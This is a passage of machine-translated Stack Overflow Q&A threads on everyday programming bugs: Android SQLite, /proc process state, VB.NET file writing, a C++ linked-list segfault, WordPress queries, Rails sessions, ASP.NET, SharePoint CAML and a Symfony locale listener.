02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1651)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1667)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.app.ActivityThread.access$1500(ActivityThread.java:117)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:935)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.os.Handler.dispatchMessage(Handler.java:99)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.os.Looper.loop(Looper.java:130)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.app.ActivityThread.main(ActivityThread.java:3687)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at java.lang.reflect.Method.invokeNative(Native Method)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at java.lang.reflect.Method.invoke(Method.java:507)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:842)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:600)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at dalvik.system.NativeStart.main(Native Method)
02-15 15:33:35.769: E/AndroidRuntime(20339): Caused by: java.lang.IllegalArgumentException: the bind value at index 1 is null
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.database.sqlite.SQLiteProgram.bindString(SQLiteProgram.java:237)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.database.sqlite.SQLiteQuery.bindString(SQLiteQuery.java:185)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.database.sqlite.SQLiteDirectCursorDriver.query(SQLiteDirectCursorDriver.java:48)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.database.sqlite.SQLiteDatabase.rawQueryWithFactory(SQLiteDatabase.java:1356)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.database.sqlite.SQLiteQueryBuilder.query(SQLiteQueryBuilder.java:330)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.database.sqlite.SQLiteQueryBuilder.query(SQLiteQueryBuilder.java:280)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at com.agmsi.medical.MedicalListActivity.fillMedicalList(MedicalListActivity.java:85)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at com.agmsi.medical.MedicalListActivity.onCreate(MedicalListActivity.java:42)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at com.agmsi.medical.EditMedicalActivity.onCreate(EditMedicalActivity.java:41)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
02-15 15:33:35.769: E/AndroidRuntime(20339):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1615)
02-15 15:33:35.769: E/AndroidRuntime(20339):    ... 11 more 
```

好吧，由于错误发生在本节之后，我想这是部分

```
 Intent editMedical = new Intent(MedicalListActivity.this,
       EditMedicalActivity.class);

 editMedical.putExtra("patientName", strMedicalName);
 editMedical.putExtra("patientGroup", strMedicalType);
 editMedical.putExtra("treatmentDate", strMedicalTreatmentDate);
 editMedical.putExtra("medicalTreatment", strMedicalTreatment);
 String strCurrentPatient = String.valueOf(MedicalId);
 editMedical.putExtra("medicalId", strCurrentPatient);
 MedicalListActivity.this.startActivity(editMedical); 
```

在此之后立即显示错误 - 所以我不确定它是在这里还是其他地方，这就是为什么我从所涉及的两个领域发布代码的原因

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:42:52.573

堆栈跟踪使它看起来像以下行是问题：

```
Cursor c = mDB.query(Medical.MEDICAL_TABLE_NAME, EditColumnsToReturn,
        Medical._ID + "=?", astrArgs, null, null, null, null); 
```

你在扩展代码库吗？你确实使用不同的风格。也许其他风格适合你：

```
Cursor c = queryBuilder.query(mDB, EditColumnsToReturn, Medical._ID + "=?", astrArgs,
        null, null, null); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T22:53:27.150

这是一个 sqlite（数据库错误）。在查看您的代码并将其与我自己的代码进行比较之后，`editPatientToGet`您传递给的似乎`fillMedicalList(String editPatientToGet);`是 null

您的 logcat 可以在此行上确认它：

```
02-15 15:33:35.769: E/AndroidRuntime(20339):    at com.agmsi.medical.MedicalListActivity.fillMedicalList(MedicalListActivity.java:85) 
```

# linux - Node.js：在 Linux 中观察进程的状态变化

> ID：14903936
> 
> 赞同：2
> 
> 时间：2013-02-15T21:51:51.090
> 
> 标签：linux, bash, node.js, process

Linux 文件系统中是否有我可以监视更改以监视进程状态的文件？换句话说，是否有可以监视的文件以进行快速的进程状态更改检测？

我会假设它在`/proc`目录中，我想使用 Node.js 和文件系统函数`fs.watch()`来查找进程状态的即时更改。（如运行、冻结、不存在等）

是否有可以在其中找到进程状态的文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:58:53.063

当前进程状态可以在 中找到`/proc/$PID/stat`。这是来自的第三个字段`man proc`：

> ```
>  state %c    One character from the string "RSDZTW"  where
>               R  is running, S is sleeping in an interrupt‐
>               ible wait, D is  waiting  in  uninterruptible
>               disk  sleep,  Z  is  zombie,  T  is traced or
>               stopped (on a signal), and W is paging. 
> ```

您是否可以在其上使用文件系统监视功能是另一回事，因为 /proc 文件不是真正的文件，而是按需生成数据的句柄。

# vb.net - 使用 Visual Basic 将多行写入文本文件

> ID：14903938
> 
> 赞同：2
> 
> 时间：2013-02-15T21:51:52.993
> 
> 标签：vb.net, text-files, streamwriter

我正在尝试检查文件是否存在，如果存在则什么都不做。如果文件不存在，则创建文本文件。然后我想将文本写入该文件。这段代码我哪里出错了？我只是想在文本文件中写入多行，而那部分不起作用。它正在创建文本文件......只是不写入它。

```
Dim file As System.IO.FileStream
 Try
  ' Indicate whether the text file exists
  If My.Computer.FileSystem.FileExists("c:\directory\textfile.txt") Then
    Return
  End If

  ' Try to create the text file with all the info in it
  file = System.IO.File.Create("c:\directory\textfile.txt")

  Dim addInfo As New System.IO.StreamWriter("c:\directory\textfile.txt")

  addInfo.WriteLine("first line of text")
  addInfo.WriteLine("") ' blank line of text
  addInfo.WriteLine("3rd line of some text")
  addInfo.WriteLine("4th line of some text")
  addInfo.WriteLine("5th line of some text")
  addInfo.close()
 End Try 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-15T22:01:22.513

您似乎没有正确释放您分配给此文件的资源。

确保始终将`IDisposable`资源包装在 Using 语句中，以确保在完成使用它们后立即正确释放所有资源：

```
' Indicate whether the text file exists
If System.IO.File.exists("c:\directory\textfile.txt") Then
    Return
End If

Using Dim addInfo = File.CreateText("c:\directory\textfile.txt")
    addInfo.WriteLine("first line of text")
    addInfo.WriteLine("") ' blank line of text
    addInfo.WriteLine("3rd line of some text")
    addInfo.WriteLine("4th line of some text")
    addInfo.WriteLine("5th line of some text")
End Using 
```

但在您的情况下，使用该[`File.WriteAllLines`](http://msdn.microsoft.com/en-us/library/dd383693.aspx)方法似乎更合适：

```
' Indicate whether the text file exists
If System.IO.File.exists("c:\directory\textfile.txt") Then
    Return
End If

Dim data As String() = {"first line of text", "", "3rd line of some text", "4th line of some text", "5th line of some text"}
File.WriteAllLines("c:\directory\textfile.txt", data) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T22:01:44.853

这一切都很好！- 这不是创建和写入文件的最佳方式 - 我宁愿创建我想要写入的文本，然后将其写入一个新文件，但是鉴于您的代码，所缺少的只是关闭在写入之前创建文件。只需更改此行：

```
file = System.IO.File.Create("c:\directory\textfile.txt") 
```

至：

```
file = System.IO.File.Create("c:\directory\textfile.txt")
file.close 
```

其余的都将起作用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-11-18T12:20:10.197

```
 file = System.IO.File.Create("path") 
```

***创建后关闭文件，然后尝试写入它。***

```
 file.Close()
     Dim addInfo As New System.IO.StreamWriter("path") 
```

# c++ - 链表分段错误

> ID：14903940
> 
> 赞同：0
> 
> 时间：2013-02-15T21:51:56.770
> 
> 标签：c++, linked-list, singly-linked-list

为什么这会导致 SegFault 错误？我试图用 gdb 运行回溯，但它没有给我任何帮助。任何帮助将不胜感激，我已经为此努力了好几个小时。

我的节点.h

```
#ifndef NODE_H
#define NODE_H

#include <string>
using namespace std;

class Node
{
  public:

    Node(const string, const int) ;
   ~Node() { }
    void setNext(Node *);//setter for the next variable
    Node * getNext();// getter for the next variable
    string getKey();// getter for the key variable
    int getDistance();   // getter for the dist variable

  private:
    Node *next;
    int dist;
    string key;
};

#endif 
```

我的节点.cpp

```
#include "node.h"
#include <string>

Node::Node(string k, int d){
    key = k;
    dist = d;
}

void Node::setNext(Node * n){
    next = n;
}

Node * Node::getNext(){
    return next;
}

string Node::getKey(){
return key;
}

int Node::getDistance(){
    return dist;
} 
```

我的清单.h

```
#ifndef LIST_H
#define LIST_H

#include "node.h"

class SLL
{
    public:
        SLL();
        ~SLL() { }
               void Insert (string searchKey, int distance);
               bool Delete (string searchKey);
               void Print();
               int Search(string searchKey);

    private:
        int count;
        Node *head;
    Node *iterator;
    Node *temp;
};

#endif 
```

我的 List.cpp

```
#include "list.h"
#include <iostream>

SLL::SLL():head(0){}

void SLL::Insert(string searchKey, int distance){
Node * temp = new Node(searchKey, distance);

if(head == 0){
    head = temp;
}
else{
    temp->setNext(head);
    head = temp;
}
}

bool SLL::Delete(string searchKey){
 if(head == 0){
cout << "An attempt was made to delete a node from an empty list" << endl;
 }
 else{
Node* iterator = head;
Node* last = 0;

while(iterator != 0){
   if (iterator->getKey() == searchKey){
    break;
   }
   else{
    last = iterator;
    iterator = iterator->getNext();
   }
}
if (iterator == 0){
    return false;
}
else{
    if(head == iterator){
        head = head->getNext();

    }
    else {
        last->setNext(iterator->getNext());
    }
    delete iterator;

    }

    }
 }

void SLL:: Print(){
iterator = head;
while(iterator != 0){   
    cout << iterator->getKey()  << "-" << iterator->getDistance() << endl;
    iterator = iterator->getNext();
 }

}

int SLL::Search(string searchKey){

 } 
```

我的 main.cpp

```
#include "list.h"
#include "node.h"
#include <iostream>

using namespace std;

int main(int argc, char* argv[]) {
    SLL * sll; 

    sll->Insert("test", 1);
    sll->Insert("test2", 2);
    sll->Delete("test");
    sll->Print();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:56:45.913

提示：Segfault 发生在这里：

```
int main(int argc, char* argv[]) {
    SLL * sll; 

    sll->Insert("test", 1); // BIG segfault here.
    ... 
```

（没有完整的答案，因为这看起来像家庭作业。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:57:32.503

在您的 main 函数中，指向的指针`SSL`未初始化，但您取消引用它。这是未定义的行为。在您的特定情况下，这会导致分段违规。尝试更改代码以在堆栈上创建`SSL`对象：

```
int main(int argc, char* argv[]) {
    SLL sll;

    sll.Insert("test", 1);
    // ...
} 
```

或堆：

```
int main(int argc, char* argv[]) {
    SLL * sll = new SLL();

    sll->Insert("test", 1);
    // ...
} 
```

顺便说一句，你永远不会使用类的`temp`, `iterator`, ... 字段`SLL`，永远不要初始化它们。在您的实现中，您定义了隐藏它们的局部变量，因此我建议删除这些字段或在构造函数中初始化它们。

# wordpress - 当 wp_query 没有时 query_posts 工作 - 试图理解（WordPress）

> ID：14903945
> 
> 赞同：1
> 
> 时间：2013-02-15T21:52:07.623
> 
> 标签：wordpress, loops

这是一个奇怪的问题，因为我已经找到了一个可行的解决方案。但是：我真的很想了解它为什么起作用，以及为什么*看起来*应该有的东西没有。如果你能解释我为什么是个白痴，我将不胜感激。

任务：修改主循环以排除一个类别，并且每页只显示两个帖子。

这是有效的：

```
 <?php
    $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
    query_posts("cat=-17,-18&posts_per_page=2&paged=$paged");
    ?> 
```

这是没有的：

```
 <?php $query = new WP_Query( 'cat=-17', 'posts_per_page=2' ); ?> 
```

这也没有：

```
 <?php $query = array (
  'cat' => -17,
  'posts_per_page' => 2
    );
  $queryObject = new WP_Query($query);
?> 
```

所以：这里发生了什么？

非常感谢，

-m

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T23:26:59.447

它不起作用的原因有几个：

1)`$query = new WP_Query( 'cat=-17', 'posts_per_page=2' );`不起作用，因为您试图传递 2 个参数。如果您正在执行字符串查询，它需要看起来像这样：

```
$query = new WP_Query( 'cat=-17&posts_per_page=2' ); 
```

2）您的第二个查询是正确的，但它“不工作”的原因很可能是您的后续循环 - 您已将其排除在代码之外。当您使用 query_posts 时，您正在修改全局 $wp_query 对象，因此您的循环可以如下所示：

```
if(have_posts()) : while(have_posts()) : the_post();
    //Do stuff....
endwhile;endif; 
```

但是使用 WP_Query 的新实例需要看起来不同。这是您的固定代码：

```
<?php
$query = array (
    'cat' => -17,
    'posts_per_page' => 2
);
$queryObject = new WP_Query($query);
if($queryObject->have_posts()) : while($queryObject->have_posts()) : $queryObject->the_post();
    //Do stuff....
endwhile;endif; 
```

更多关于 WP_Query 的信息：

[http://codex.wordpress.org/Class_Reference/WP_Query](http://codex.wordpress.org/Class_Reference/WP_Query)

# java - 试图从 servlet 中的会话中检索 arraylist

> ID：14903954
> 
> 赞同：0
> 
> 时间：2013-02-15T21:52:48.687
> 
> 标签：java, jsp, servlets

`userList`在将 ArrayList传递给 JSP 之前，我使用 HttpSession 将 ArrayList 存储为原始 Servlet 的会话属性。然后在下一个 JSP 中调用它，然后从该 JSP 调用另一个 Servlet。

小服务程序 1 -> JSP1 -> JSP2 -> 小服务程序 2

在 Servlet 1 中，我将其设置为 session ：

```
if (!userList.isEmpty()) {
    session.setAttribute("userList", userList); 
} 
```

我在 JSP 1 和 JSP 2 中对其进行迭代，并在 Servlet 2 中再次调用它。我需要将 ArrayList 用作 servlet 2 中另一个方法的参数。

```
EditStudentForm edt = (EditStudentForm)form;
List<UserApplication> studtList = new ArrayList<UserApplication>();
if ((session.getAttribute("userList")) instanceof List){
    studtList = (ArrayList<UserApplication>)request.getSession().getAttribute("userList");
}
try {
    uaDAO.editUser(edt,studtList);
    action_forward = EDITSUCCESS;
} 
```

看起来铸造并没有真正起作用，因为 ArrayList 的大小为 1（我期望大小至少为 30）

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:01:01.390

尝试投射到`List<UserApplication>`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:59:10.083

铸造工作正常，与列表的大小无关。铸造只是告诉你，你所存储的`userList`实际上是一个 ArrayList。如果大小不同，则似乎暗示您的逻辑在其他地方存在错误。`userList`调用后是否更改变量引用的列表`session.setAttribute()`？

# ruby-on-rails - 销毁用户后清除会话

> ID：14903955
> 
> 赞同：2
> 
> 时间：2013-02-15T21:53:01.913
> 
> 标签：ruby-on-rails

我正在与 Chrome 中的管理员用户和另一个浏览器中的普通用户一起工作。在我作为管理员销毁其中一个普通用户后，我尝试在被销毁的用户正在使用的浏览器中重新打开应用程序。但是，我收到此错误消息

```
Couldn't find Twitteruser with id=2 
```

所以会话在用户被销毁后仍然存在于浏览器中

会话是这样创建的

```
 def create
  twitteruser = Twitteruser.from_omniauth(env["omniauth.auth"])
  session[:twitteruser_id] = twitteruser.id
  redirect_to twitterquestions_url, notice: "Signed in!"
end 
```

在 application_controller 中，当前用户是这样创建的

```
 def current_user
         @current_user ||= Twitteruser.find(session[:twitteruser_id]) if    session[:twitteruser_id]
  end 
```

这是破坏动作

```
 def destroy
    Twitteruser.find(params[:id]).destroy
    flash[:success] = "User destroyed."
    redirect_to users_url
 end 
```

根据我发现的其他 SO 答案，我尝试以两种不同的方式重置会话，但它们都重置了管理员用户的会话，而不是被破坏的用户

```
 def destroy
    Twitteruser.find(params[:id]).destroy
    #1\. session[:twitteruser_id] = nil destroys my own session, not deleted users
    #2\. reset_session  #reset admin's session
    flash[:success] = "User destroyed."
    redirect_to twitterusers_url
 end 
```

我还尝试将参数传递给 reset_session 但它不接受它们。

谁能告诉我如何清除被破坏的用户会话？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T22:11:37.083

这取决于您使用什么来支持您的会话。如果会话在 Cookie 中，那么您的管理员无法使用它，因为没有任何服务器端可以使用。无论如何，弄乱别人的会话可能是不可能的，因为您不知道会话 ID。

你想要做的是要么捕获`ActiveRecord::RecordNotFound`find 抛出的，要么使用 find_by_id 返回 nil。当用户尝试使用引用已删除用户的会话访问站点时，您可以终止该会话。

```
def current_user
  @current_user ||= Twitteruser.find(session[:twitteruser_id]) if session[:twitteruser_id]
rescue ActiveRecord::RecordNotFound
  session[:twitteruser_id] = nil # or reset_session
end 
```

或者

```
def current_user
  @current_user ||= fetch_user(session[:twitteruser_id])
end

def fetch_user(id)
  Twitteruser.find_by_id(id) || reset_session unless id.nil?
end 
```

无论 Twitter 用户如何被删除，这都会起作用。例如，假设您从没有会话的 rails 控制台中删除了用户。

# asp.net - 我无法让我的列表框填充 sql 查询的输出

> ID：14903957
> 
> 赞同：2
> 
> 时间：2013-02-15T21:53:03.353
> 
> 标签：asp.net, sql-server, vb.net

我似乎无法弄清楚我在哪里出错了。我有两个列表框，第一个从 sql 服务器上的存储过程中提取数据。the second list box is supposed to populate when the an item in the first list box is selected. 当单击第一个列表框中的项目时，第二个列表框的存储过程应传递所选项目的文本。问题是第二个列表框没有填充。我将不胜感激任何有用的反馈，或者可能是一种更简单的方法来完成我正在尝试做的事情。

ASP.NET：

```
<asp:ListBox ID="ListBox1" runat="server" DataSourceID="LOCATION" DataTextField="L_Name" DataValueField="L_Name" AutoPostBack="True"></asp:ListBox>

<asp:SqlDataSource ID="LOCATION" runat="server" ConnectionString="<%$ ConnectionStrings:SAMC_2ConnectionString %>" SelectCommand="L_Get" SelectCommandType="StoredProcedure"></asp:SqlDataSource>

<asp:ListBox ID="ListBox2" runat="server" Height="150px" Width="200px" AutoPostBack="True" DataTextField="C_Name" DataValueField="C_Name" />

<asp:SqlDataSource ID="CompByLocal" runat="server" ConnectionString="<%$ ConnectionStrings:SAMC_2ConnectionString %>" SelectCommand="L_Get_C" SelectCommandType="StoredProcedure">    

<SelectParameters>
<asp:ControlParameter ControlID="ListBox1" DefaultValue="" Name="L_Name" PropertyName="SelectedValue" Type="String" />
<asp:Parameter Name="L_ID" Type="Int32" />
        </SelectParameters>
    </asp:SqlDataSource> 
```

VB.NET：

```
Protected Sub ListBox1_SelectedIndexChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListBox1.SelectedIndexChanged
        Dim val As String = ListBox1.Items(ListBox1.SelectedIndex).ToString
        TextBox1.Text = val
        ListBox2.Items.Clear()
        ListBox2.DataSource = CompByLocal
        ListBox2.DataBind()
    End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T22:33:08.980

我的建议是放弃 SqlDataSources 并在后端完成所有操作 - 然后您可以更准确地了解我的经验何时发生事情。我已尽力在下面编写必要的代码，但我的母语是 C# - 我使用了在线转换器，所以请原谅任何小的语法错误。

ASPX：

```
<asp:ListBox  ID="ListBox1" runat="server"  DataTextField="L_Name" DataValueField="L_Name" AutoPostBack="True"></asp:ListBox>

<asp:ListBox ID="ListBox2" runat="server" Height="150px" Width="200px" AutoPostBack="True" DataTextField="C_Name" DataValueField="C_Name" /> 
```

.VB

```
Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) 
if (IsPostback) return
Dim results As New DataTable()
Using connection As New SqlConnection(ConfigurationManager.ConnectionStrings("SAMC_2ConnectionString "))
    connection.Open()
    Using command As New SqlCommand("L_Get", connection)
        command.CommandType = CommandType.StoredProcedure
        results.Load(command.ExecuteReader())
    End Using
End Using
ListBox1.DataSource = results;
ListBox1.DataBind();
End Sub

Protected Sub ListBox1_SelectedIndexChanged(ByVal sender As Object, ByVal e As System.EventArgs) 
Dim results As New DataTable()
Using connection As New SqlConnection(ConfigurationManager.ConnectionStrings("SAMC_2ConnectionString "))
    connection.Open()
    Using command As New SqlCommand("L_Get_C", connection)
        command.CommandType = CommandType.StoredProcedure
        command.Parameters.AddWithValue("L_ID",ListBox1.SelectedValue)
        results.Load(command.ExecuteReader())
    End Using
End Using
ListBox2.DataSource = results
ListBox2.DataBind()
End Sub 
```

# sharepoint - 根据从 Sharepoint CAML Query 到 SPListItemCollection 的索引获取项目

> ID：14903960
> 
> 赞同：0
> 
> 时间：2013-02-15T21:53:14.997
> 
> 标签：sharepoint, sharepoint-2010, caml

我正在尝试使用 caml 查询列表项目（第一次这样做）并根据修改日期对项目进行排序，以便我可以访问最新的文档。但是，当尝试根据 ID 获取 SPListItem 时，我失败了。

代码：

```
SPQuery query = new SPQuery();
String camlquery = "<OrderBy><FieldRef Name='Modified' Ascending='False' /></OrderBy>";                        
query.ViewAttributes = "Scope = 'Recursive'";
query.ViewFields = "<FieldRef Name='Modified' /><FieldRef Name='Title' /><FieldRef Name='Name' />";
query.Query = camlquery;
query.IncludeMandatoryColumns = true;
SPListItemCollection col = list.GetItems(query);

//failing here... I think   
SPListItem item = col.GetItemById(0); 
```

有没有办法根据 SPListItemCollection 中的索引获取 SPListItem？

我努力了

```
SPListItem item = col[0]; 
```

也没有运气。

这是我得到的错误：

值不在预期范围内。说明：执行当前 Web 请求期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。

异常详细信息：System.ArgumentException：值不在预期范围内。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:10:53.453

如果你想`SPListItem`使用，`Id`那么你不需要去 caml，试试这个，

```
 SPSite oSite = new SPSite("http:/MyTestSite/");
 SPWeb oWeb = oSite.OpenWeb();
 SPList oList = oWeb.Lists["MyCustomList"];

 SPListItem oListItem = oList.Items.GetItemById(1); 
```

但是如果您坚持使用 caml 来获取它，请确保您包含`Id`在您的`ViewFields`caml 查询中。

并使用`Id`as 获取项目：

```
foreach (ListItem item in col)
{
    if(item["Id"] == 1) //Only an example
    {
        var itemFromId = item;
    }
} 
```

还要注意，ID 属性的值与列表项集合中项的索引不同。此属性包含项目的从 1 开始的整数 ID，它比之前添加的项目的 ID 大一。如果项目被删除，它的 ID 不会被重用。[[更多信息]](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.splistitem.id.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T19:15:10.387

问题在于我要退回的收藏品。在使用该项目之前，我必须确保有结果：

```
if (col.Count > 0)
{
SPListItem item = col[0];
} 
```

愚蠢的错误。

# symfony - Symfony2 语言环境整页事件监听器

> ID：14903963
> 
> 赞同：3
> 
> 时间：2013-02-15T21:53:34.493
> 
> 标签：symfony, service, kernel, listener, translation

当用户单击语言以例如 france('fr') 时，我需要创建一个像 facebook lang 系统这样的系统，页面将重新加载，messages.fr.yml 中的所有内容都将显示...

我试图制作路线，`/language/{localExtension}`但是当我在那里设置区域设置然后重定向它不起作用......我不知道我假设它只是针对某些页面而不是全局的？因为当我设置`setLocale('fr')`在控制器的顶部时，它可以工作......

`www.example.com/contact/en`我在使用等时发现了一些`/contact/fr`文章

但我想`/contact`从以前选择的语言显示内容。或者当用户没有更改它时，就像现在一样默认'en'......

我整天都在谷歌搜索，我认为应该通过...服务 => 侦听器和...在 kernel.request 上完成？或类似的东西。

这里有一些有趣的链接[Symfony2 错误的语言环境检测？](https://stackoverflow.com/questions/7656114/symfony2-wrong-locale-detection)我想这就是我需要的？或者？我尝试设置服务并创建侦听器，但出现了一些错误，我什至不知道这是否是创建它的方式：/

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-17T09:42:49.923

是的，出于某种原因，您需要使用侦听器：

```
<?php

namespace Your\Bundle\Listener;

use Symfony\Component\HttpKernel\Event\GetResponseEvent;
use Symfony\Component\HttpKernel\KernelEvents;
use Symfony\Component\EventDispatcher\EventSubscriberInterface;

class LocaleListener implements EventSubscriberInterface
{
  private $defaultLocale;

  public function __construct($defaultLocale = 'en')
  {
  $this->defaultLocale = $defaultLocale;
  }

  public function onKernelRequest(GetResponseEvent $event)
  {
  $request = $event->getRequest();
  if (!$request->hasPreviousSession()) {
      return;
  }

  if ($locale = $request->attributes->get('_locale')) {
      $request->getSession()->set('_locale', $locale);
  } else {
      $request->setLocale($request->getSession()->get('_locale', $this->defaultLocale));
  }
  }

  static public function getSubscribedEvents()
  {
  return array(
      // must be registered before the default Locale listener
      KernelEvents::REQUEST => array(array('onKernelRequest', 17)),
  );
  }
}
?> 
```

在你的 service.xml 中注册你的监听器：

```
<service id="my.listener" class="Your\Bundle\Listener\LocaleListener">
    <argument>%locale%</argument>
    <tag name="kernel.event_subscriber"/>
</service> 
```

如何在树枝模板中实现语言切换器的示例：

```
{% for locale in ['en', 'fr','zh'] %}
    <li>
      <a href="{{ path(app.request.get('_route'), app.request.get('_route_params')|merge({'_locale' : locale})) }}">
        {% if locale == 'en' %}
        <img title="English" src="{{ asset('bundles/fkmywebsite/images/UnitedStates.png') }}" alt="English" height="30" width="30"/>
        {% elseif locale == 'fr' %}
        <img title="Français" src="{{ asset('bundles/fkmywebsite/images/France.png') }}" alt="Français" height="30" width="30"/>
        {% endif %}
      </div>
    </li>
{% endfor %} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-30T17:27:14.180

听众工作并帮助了我很多。我重用脚本在​​会话中设置区域设置（带有子标签区域）和语言（区域设置语言代码）

```
 <?php
    namespace Fer\CaveBundle\EventListener;
    use Symfony\Component\HttpKernel\Event\GetResponseEvent;
    use Symfony\Component\HttpKernel\KernelEvents;
    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpFoundation\Session\Session;
    use Symfony\Component\DependencyInjection\ContainerInterface;

    class LocaleListener implements EventSubscriberInterface
    {
        private $defaultLocale;
        private $locales;

    public function __construct($defaultLocale='es', ContainerInterface $container)
    {
        //values from configuration of my bundle
        $backend =  $container->getParameter('cave.backend');
        $this->locales = $backend['_locale'];  

    //    $this->locales = array( 'es'=>'es_ES'
    //                            'en'=>'en_GB,en_US',
    //                            'fr'=>'fr_FR,fr_BG'
    //                        );
        //default must exists in _locales array. locale_lookup Default: es_ES
        $this->defaultLocale = locale_lookup(array_keys($this->locales),
                                            $defaultLocale,
                                            false,
                                            current(explode(',',implode(',',array_values($this->locales)))));

    }

    public function onKernelRequest(GetResponseEvent $event)
    {
        $request = $event->getRequest();
        $session = $request->getSession();

        //  Locale Get parameters
        if($locale = $request->query->get('_locale'))
        {
            $this->setLocale($request, $session, $locale);
            return;
        }

        //  Locale Post parameters with custom form name
        if($locale = $request->request->get('_localeForm'))
        {
         $this->setLocale($request, $session, $locale['_locale']);
         return;
        }

        //  Locale session parameters
        if($locale = $session->get('_locale'))
        {
            $this->setLocale($request, $session, $locale);
            return;
        }    

        //Locale in browser
        if($locale = $request->getPreferredLanguage()){
            $this->setLocale($request, $session, $locale);
            return;
        }    

        $this->setLocale($request, $session, $this->defaultLocale);
        return;
    }

    public function setLocale($request,$session,$locale)
    {
            //search language and lookup, default first locale in language
            if(in_array(current(locale_parse($locale)),array_keys($this->locales))){
                $locale = locale_lookup(explode(',',$this->locales[current(locale_parse($locale))]),
                                    $locale,
                                    false,
                                    current(explode(',',$this->locales[current(locale_parse($locale))])));
            }else{
                $locale = $this->defaultLocale;
            }

            //set session parameter
            if($locale!==$session->get('_locale')){
                $session->set('_locale',$locale);
                $session->set('language', current(locale_parse($locale)));//language code
            }
            //Set the default PHP locale.(for translations)
            $request->setLocale($locale);
            //set post parameter
            $request->request->set('_locale',$locale);  
            //set get parameter
            $request->query->set('_locale',$locale);  

            return;
    }

    static public function getSubscribedEvents()
    {
    return array(
        // must be registered before the default Locale listener
        KernelEvents::REQUEST => array(array('onKernelRequest', 17)),
    );
    }

    }
    ?> 
```

如果您发送 post 参数，则控制器中的表单：

```
 public function indexAction()
    {
        $form = $this->get('form.factory')->createNamedBuilder('_localeForm')
             ->add('_locale', 'choice', array(
                'choices'   => array('en' => 'english', 'es' => 'Español'),//etc
                'required'  => true,
            ))->getForm();

            return $this->render(
            'myProject:myBundle:index.html.twig',
            array('_localeForm' => $form->createView())
        );
    } 
```

示例树枝形式：

```
 <form  action="" method="post"  {{ form_enctype(_localeForm) }}>
    {{ form_widget(_localeForm)}} <br><br>
    <input type="submit" value="Enviar" />
    {{ form_rest(_localeForm) }}
    </form> 
```

在 url 中发送语言环境，如果使用 twig 函数从配置中获取语言环境数组会更好：

```
 {% for locale in ('fer_cave.backend._locale'|caveParam)|keys %}
    <li {% if locale == app.session.get('language') %}class="active" style="color: red"{% endif %}>
    {#<a href="{{path(app.request.get('_route'), {'_locale': locale}) }}">{{ locale }}</a>#}
    {% set route = app.request.get('_route') %}
    {% set route_params = app.request.get('_route_params') %}
    <a href="{{ path(route, route_params | merge({ '_locale': locale })) }}">{{ locale }}</a>
    {% endfor %}
    {#
    Locale in session: {{app.session.get('_locale')}}<br>
    Language in session: {{app.session.get('language')}}<br>
    Locale as get param: {{app.request.get('_locale')}}<br>
    Locale as post {{app.request.request.get('_locale')}}
    #} 
```

如果您想从捆绑配置中检索语言环境，请将 serviceContainer 添加到侦听器：

```
 <service id="cave.listener" class="Fer\CaveBundle\EventListener\LocaleListener">
        <argument>%locale%</argument>
        <argument type="service" id="service_container" />
        <tag name="kernel.event_subscriber"/>
    </service> 
```

为什么不呢，myProject/myBUndle/DependencyInjection 中的示例配置数组

```
 //-------------------ejemplo de backend-------------------//  
     ->arrayNode('backend')
        ->addDefaultsIfNotSet()
        ->children()
            ->arrayNode('_locale')
                ->addDefaultsIfNotSet()
                ->children()
